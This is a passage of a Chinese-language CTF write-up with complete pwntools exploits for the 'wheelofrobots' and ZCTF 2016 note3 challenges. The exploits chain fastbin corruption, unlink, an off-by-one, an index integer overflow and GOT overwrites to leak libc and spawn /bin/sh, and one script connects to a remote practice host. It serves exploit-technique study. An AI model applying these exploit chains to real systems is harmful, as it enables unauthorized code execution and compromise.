   # now fastbin 0x20, idx2->0x603138->NULL
   change(2, p64(0x603138))
   # off-by-one 覆写 idx2 inuse 为 1
   # 让我们再一次申请 2 bender
   overflow_benderinuse('\x00')
   # add 2 bender again, fastbin 0x603138->NULL
   # 将原来 2 bender 空间申请出来
   add(2, 1)
   # in order to malloc chunk at 0x603138
   # 绕过fastbin size 检查：将size位伪造一个fastbin范围的值
   # we need to bypass the fastbin size check, i.e. set *0x603140=0x20
   # 0x603140 是 3 Devil 的size位，申请fastbin范围即可
   add(3, 0x20)
   # trigger malloc, set tinny point to 0x603148
   add(1)
   # 释放无用堆
   # wheels must <= 3
   # only save tinny(0x603138)
   remove(2)
   remove(3)
   ```

   

2. 分别分配合适大小的物理相邻的 chunk，其中包括 destructor。借助上面可以任意长度堆溢出的漏洞，对 destructor 对应的 chunk 进行溢出，将其溢出到下一个物理相邻的 chunk，从而实现对 0x6030E8 处 fake chunk 进行 unlink 的效果，这时 bss 段的 destructor 指向 0x6030D0。从而，我们可以再次实现覆盖 bss 段几乎所有的内容。

   unlink 将 6 destructor 的指针指向 0x06030E8 - 0x18

   ```python
   # alloc 6 destructor size 60->0x50, chunk content 0x40
   add(6, 3)
   # alloc 3 devil, size=20*7=140, bigger than fastbin
   add(3, 7)
   # edit destructor's size to 1000 by tinny
   change(1, p64(1000))
   # place fake chunk at destructor's pointer
   fakechunk_addr = 0x6030E8
   fakechunk = p64(0) + p64(0x20) + p64(fakechunk_addr - 0x18) + p64(
       fakechunk_addr - 0x10) + p64(0x20)
   fakechunk = fakechunk.ljust(0x40, 'a')
   fakechunk += p64(0x40) + p64(0xa0)
   change(6, fakechunk)
   # trigger unlink
   remove(3)
   ```

   

3. 构造一个任意地址写的漏洞。通过上述的漏洞将已经分配的轮子 1 tinny 指针覆盖为 destructor 的地址，那么此后编辑 tinny 即在编辑 destructor 的内容，进而当我们再次编辑 destructor 时就相当于任意低地址写。

   ```python
   # make 0x6030F8 point to 0x6030E8
   payload = p64(0) * 2 + 0x18 * 'a' + p64(0x6030E8)
   change(6, payload)
   ```

   

4. 由于程序只是在最后启动机器人的时候，才会随机输出一些轮子的内容，并且一旦输出，程序就会退出，由于这部分我们并不能控制，所以我们将 `exit()` patch 为一个 `ret` 地址。这样的话，我们就可以多次输出内容了，从而可以泄漏一些 got 表地址。**其实，既然我们有了任意地址写的漏洞，我们也可以将某个 got 写为 puts 的 plt 地址，进而调用相应函数时便可以直接将相应内容输出。但是这里并不去采用这种方法，因为之前已经在 hitcon stkof 中用过这种手法了。**

   > 将 exit() got 表修改为 ret ，就通过多次调用总会输出被我们修改指针的轮子
   >
   > hijack 某个函数 got 为 puts ，比如 free 那么实际上不是释放了是输出指针指向的内容

   ```python
   # make exit just as return
   write(elf.got['exit'], 0x401954)
   ```

   

5. 在泄漏了相应的内容后，我们便可以得到 libc 基地址，system 地址，libc 中的 /bin/sh 地址。进而我们修改 free@got 为 system 地址。从而当再次释放某块内存时，便可以启动 shell。

### EXP

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context(log_level='debug',os='linux',arch='amd64')

p = process("./wheelofrobots")
elf = ELF("./wheelofrobots")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


def add(idx, size=0):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Your choice :')
    p.sendline(str(idx))
    if idx == 2:
        p.recvuntil("Increase Bender's intelligence: ")
        p.sendline(str(size))
    elif idx == 3:
        p.recvuntil("Increase Robot Devil's cruelty: ")
        p.sendline(str(size))
    elif idx == 6:
        p.recvuntil("Increase Destructor's powerful: ")
        p.sendline(str(size))


def remove(idx):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Your choice :')
    p.sendline(str(idx))


def change(idx, name):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Your choice :')
    p.sendline(str(idx))
    p.recvuntil("Robot's name: \n")
    p.send(name)


def start_robot():
    p.recvuntil('Your choice :')
    p.sendline('4')


def overflow_benderinuse(inuse):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Your choice :')
    p.send('9999' + inuse)


def write(where, what):
    change(1, p64(where))
    change(6, p64(what))


def exp():
    print "step 1 - fastbin attack"
    # add a fastbin chunk 0x20 and free it
    # fastbin 指针指向：2 bender->NULL
    add(2, 1)  # 2 bender
    remove(2)
    # off-by-one 覆写 idx2 inuse 为 1 让我们能编辑
    overflow_benderinuse('\x01')
    # 覆写 fd 2 0x603138, point to 2 bender's size,后面伪造堆fd就是destructor_size
    # now fastbin 0x20, idx2->0x603138->NULL
    change(2, p64(0x603138))
    # off-by-one 覆写 idx2 inuse 为 1
    # 让我们再一次申请 2 bender
    overflow_benderinuse('\x00')
    # add 2 bender again, fastbin 0x603138->NULL
    # 将原来 2 bender 空间申请出来
    add(2, 1)
    # in order to malloc chunk at 0x603138
    # 绕过fastbin size 检查：将size位伪造一个fastbin范围的值
    # we need to bypass the fastbin size check, i.e. set *0x603140=0x20
    # 0x603140 是 3 Devil 的size位，申请fastbin范围即可
    add(3, 0x20)
    # trigger malloc, set tinny point to 0x603148
    add(1)
    # 释放无用堆
    # wheels must <= 3
    # only save tinny(0x603138)
    remove(2)
    remove(3)

    print 'step 2 - unlink'
    # alloc 6 destructor size 60->0x50, chunk content 0x40
    add(6, 3)
    # alloc 3 devil, size=20*7=140, bigger than fastbin
    add(3, 7)
    # edit destructor's size to 1000 by tinny
    change(1, p64(1000))
    # gdb.attach(p)
    # place fake chunk at destructor's pointer
    fakechunk_addr = 0x6030E8
    fakechunk = p64(0) + p64(0x20) + p64(fakechunk_addr - 0x18) + p64(
        fakechunk_addr - 0x10) + p64(0x20)
    fakechunk = fakechunk.ljust(0x40, 'a')
    fakechunk += p64(0x40) + p64(0xa0)
    change(6, fakechunk)
    # trigger unlink
    remove(3)

    print 'step 3 - hijack chunk1 ptr'
    # make 0x6030F8 point to 0x6030E8
    payload = p64(0) * 2 + 0x18 * 'a' + p64(0x6030E8)
    change(6, payload)

    print 'step 4 - hijack exit.got'
    # make exit just as return
    write(elf.got['exit'], 0x401954)

    print 'step 5'
    # set wheel cnt =3, 0x603130 in order to start robot
    write(0x603130, 3)
    # set destructor point to puts@got
    change(1, p64(elf.got['puts']))
    start_robot()
    p.recvuntil('New hands great!! Thx ')
    puts_addr = p.recvuntil('!\n', drop=True).ljust(8, '\x00')
    puts_addr = u64(puts_addr)
    log.success('puts addr: ' + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    log.success('libc base: ' + hex(libc_base))
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search('/bin/sh'))

    # make free->system
    write(elf.got['free'], system_addr)
    # make destructor point to /bin/sh addr
    write(0x6030E8, binsh_addr)
    # get shell
    remove(6)
    p.interactive()
    pass
if __name__ == "__main__":
    exp()
```



## ZCTF 2016 note3

### 基本情况

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
### 基本功能

基本堆管理，有增删改功能。

堆数量上限为 8 个，大小在 0~1024 之间自定义。堆指针指针和 size 分别用一个列表存放，结合后面推测出，qword_6020C0[0] 为一个缓冲区，存储刚刚操作的完的 chunk_ptr 。

### 漏洞

delete 和 edit 读取序号时有点特殊，将输入值经过加密后的结果直接当做是下标，**没有再进一步检查下标是否非法的**：

```c
v3 = v0 - 7 * (((signed __int64)((unsigned __int128)(5270498306774157605LL * (signed __int128)v0) >> 64) >> 1) - (v0 >> 63));
```

这里存在一个整型溢出，当输入值为 0x8000000000000000 ，结果为 -1 ，这样就将修改缓冲区的堆块，修改程度为 chunk7 地址：

```
.bss:
current_ptr <== edit ptr
note0_ptr
note1_ptr
note2_ptr
note3_ptr
note4_ptr
note5_ptr
note6_ptr
note7_ptr   <== size
note0_size
note1_size
note2_size
note3_size
note4_size
note5_size
note6_size
note7_size
```

由于输入长度有限，所以将原值转换为负数：``0x8000000000000000 - 0x10000000000000000`` 。

### 思路

1. 利用整型漏洞，形成一个堆溢出。修改 next_chunk 的 header 信息，构造 unlink 条件。
2. unlink 后控制 chunk_ptr 指针，实现任意地址读写。由于程序输出功能，将 free 改为 puts 用来泄露地址，然后在将 free 改为 system 。

### EXP

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
context(log_level = 'info', os='linux', arch='amd64')

# p = process("./note3")
p = remote("node3.buuoj.cn",25763)
elf = ELF("./note3")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(size,content):
	p.sendlineafter('>>\n','1')
	p.sendlineafter('1024)\n',str(size))
	p.sendlineafter('content:\n',content)

def edit(idx,content):
	p.sendlineafter('>>\n','3')
	p.sendlineafter('note:\n',str(idx))
	p.sendlineafter('content:\n',content)

def free(idx):
	p.sendlineafter('>>\n','4')
	p.sendlineafter('note:\n',str(idx))

def show():
	p.sendlineafter('>>\n','2')


for _ in range(3):
	add(0x50,'a'*8)
add(0x90,'b'*8)
for _ in range(3):
	add(0x50,'a'*8)

edit(2,'skyedidi')

ptr = 0x6020d8
payload = p64(0) + p64(0x51)
payload += p64(ptr-0x18) + p64(ptr-0x10)
payload = payload.ljust(0x50,'a')
payload += p64(0x50) + p64(0xa0)
edit(0x8000000000000000 - 0x10000000000000000,payload)
free(3)

payload = 'skyedidi' + p64(elf.got['free']) + p64(elf.got['puts'])
payload += p64(0x6020c0)
edit(2,payload)

edit(0,p64(elf.plt['puts'])[:7])
free(1)

puts_leak = u64(p.recv(6).ljust(8,'\x00'))
log.info("puts_leak:"+hex(puts_leak))
libc_base = puts_leak - 0x06f690#libc.sym['puts']
system = libc_base + 0x045390#libc.sym['system']
binsh = libc_base + 0x18cd57#next(libc.search('/bin/sh'))

edit(0,p64(system)[:7])

payload = 'skyedidi' + p64(elf.got['free']) + p64(elf.got['puts'])
payload += p64(binsh)
edit(2,payload)

free(2)
# gdb.attach(p)
p.interactive()
```

